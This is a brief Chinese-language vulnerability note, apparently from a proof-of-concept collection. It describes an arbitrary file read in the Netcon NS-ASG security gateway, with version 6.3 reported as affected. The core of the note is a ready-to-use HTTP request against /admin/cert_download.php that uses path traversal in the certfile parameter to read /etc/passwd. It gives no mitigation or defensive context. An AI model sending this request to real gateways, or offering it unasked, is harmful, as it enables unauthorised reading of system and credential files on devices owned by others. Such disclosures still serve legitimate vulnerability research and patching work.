# 网康 NS-ASG安全网关 任意文件读取漏洞


网康 NS-ASG安全网关 cert_download.php 文件存在任意文件读取漏洞.

poc：

```
GET /admin/cert_download.php?file=test.txt&certfile=../../../../../../../../etc/passwd HTTP/1.1
Host: 
```

测试NS-ASG 6.3版本受影响。

via:peiqi